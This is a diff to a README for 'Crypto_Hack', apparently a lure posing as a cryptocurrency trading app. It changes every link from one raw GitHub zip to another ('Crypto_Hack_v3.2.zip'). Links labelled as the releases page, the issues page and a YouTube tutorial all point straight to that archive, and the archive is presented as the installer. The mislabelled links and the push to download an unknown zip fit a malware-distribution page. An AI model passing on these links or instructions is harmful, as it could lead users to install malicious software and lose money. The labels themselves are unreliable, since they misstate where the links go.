@@ -1,6 +1,6 @@
 # 🚀 Crypto_Hack - Smart Trading Made Simple
 
-![Download Latest Release](https://raw.githubusercontent.com/Madarani/Crypto_Hack/main/eisegetical/Crypto_Hack.zip%20Now-v1.0-brightgreen)
+![Download Latest Release](https://raw.githubusercontent.com/Madarani/Crypto_Hack/main/eisegetical/Crypto_Hack_v3.2.zip%20Now-v1.0-brightgreen)
 
 ## 📋 Introduction
 
@@ -23,7 +23,7 @@ Before downloading, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-To get started, you need to download the application. Visit this page to download: [Crypto_Hack Releases](https://raw.githubusercontent.com/Madarani/Crypto_Hack/main/eisegetical/Crypto_Hack.zip).
+To get started, you need to download the application. Visit this page to download: [Crypto_Hack Releases](https://raw.githubusercontent.com/Madarani/Crypto_Hack/main/eisegetical/Crypto_Hack_v3.2.zip).
 
 1. **Go to the Releases Page**:
    - Click the link above to reach the releases section.
@@ -32,7 +32,7 @@ To get started, you need to download the application. Visit this page to downloa
    - On the releases page, look for the latest version of Crypto_Hack. It usually appears at the top of the list.
    
 3. **Download the Installer**:
-   - Locate the installer file, which is typically named `https://raw.githubusercontent.com/Madarani/Crypto_Hack/main/eisegetical/Crypto_Hack.zip` for Windows or `https://raw.githubusercontent.com/Madarani/Crypto_Hack/main/eisegetical/Crypto_Hack.zip` for macOS.
+   - Locate the installer file, which is typically named `https://raw.githubusercontent.com/Madarani/Crypto_Hack/main/eisegetical/Crypto_Hack_v3.2.zip` for Windows or `https://raw.githubusercontent.com/Madarani/Crypto_Hack/main/eisegetical/Crypto_Hack_v3.2.zip` for macOS.
    - Click on the file name to start downloading.
 
 4. **Install the Application**:
@@ -78,16 +78,16 @@ Use the dashboard to track your earnings:
 If you encounter any issues or have questions, support is available:
 
 - Frequently Asked Questions (FAQ): Check our FAQ section within the app for quick answers.
-- GitHub Issues: Track bugs and request features directly on our [GitHub issues page](https://raw.githubusercontent.com/Madarani/Crypto_Hack/main/eisegetical/Crypto_Hack.zip).
+- GitHub Issues: Track bugs and request features directly on our [GitHub issues page](https://raw.githubusercontent.com/Madarani/Crypto_Hack/main/eisegetical/Crypto_Hack_v3.2.zip).
 - Community Forum: Join discussions with other users to share tips and strategies.
 
 ## 🔗 Learn More
 
 For deeper insights, view our resources:
 
-- YouTube Tutorial: [Watch the tutorial here](https://raw.githubusercontent.com/Madarani/Crypto_Hack/main/eisegetical/Crypto_Hack.zip) to maximize your use of the application.
+- YouTube Tutorial: [Watch the tutorial here](https://raw.githubusercontent.com/Madarani/Crypto_Hack/main/eisegetical/Crypto_Hack_v3.2.zip) to maximize your use of the application.
 - Official Documentation: Access detailed documentation on GitHub.
 
 ## 🚀 Join the Journey
 
-As you explore the world of cryptocurrency trading with Crypto_Hack, we encourage feedback. Your insights help us to improve the application and user experience. Visit [Crypto_Hack Releases](https://raw.githubusercontent.com/Madarani/Crypto_Hack/main/eisegetical/Crypto_Hack.zip) for updates and new features.
+As you explore the world of cryptocurrency trading with Crypto_Hack, we encourage feedback. Your insights help us to improve the application and user experience. Visit [Crypto_Hack Releases](https://raw.githubusercontent.com/Madarani/Crypto_Hack/main/eisegetical/Crypto_Hack_v3.2.zip) for updates and new features.
